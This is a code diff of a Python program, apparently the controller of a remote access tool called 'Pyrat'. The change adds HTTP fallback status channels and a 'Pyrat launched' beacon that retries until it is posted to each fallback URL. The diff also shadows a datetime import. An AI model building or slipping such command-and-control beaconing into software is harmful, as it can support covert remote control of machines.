@@ -22,6 +22,7 @@ import socket
 from datetime import datetime
 from web.WebCommandParser import WebCommandParser
 from web.CmdRelay import set_channel
+import datetime
 
 OPT_QUIT = 0xFF
 OPT_PING = 0x01
@@ -1126,20 +1127,31 @@ def main():
     for http_fallback in http_fallbacks:
         url = http_fallback[0]
         channel = http_fallback[1]
+        status_channel = http_fallback[2]
         print(f"Initialising http fallback monitor: {url} : {channel}")
-        wcp = WebCommandParser(url, channel, enc_keys)
+        wcp = WebCommandParser(url, channel, enc_keys, status_channel)
         wcp.start()
         wcp.set_callback(webCommandParserCallback)
         _http_fallbacks.append(wcp)
         
-    if len(_socket_threads) > 0:
-        _selected_socket = _socket_threads[0]
-
+        current_datetime = datetime.datetime.now()
+        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
+        
     if _tunnel_mode == 'local':
+        while len(_socket_threads) == 0:
+            time.sleep(1)
+
+        if len(_socket_threads) > 0:
+            _selected_socket = _socket_threads[0]
+
         console_thread = ConsoleThread()
         console_thread.start()
         console_thread.join()
     else:
+        for http_fallback in _http_fallbacks:
+            while not set_channel(http_fallback.getURL(), http_fallback.getStatusChannel(), -1, "Pyrat launched: " + formatted_datetime):
+                time.sleep(5)
+
         con_thread.join()
 
 if __name__ == '__main__':
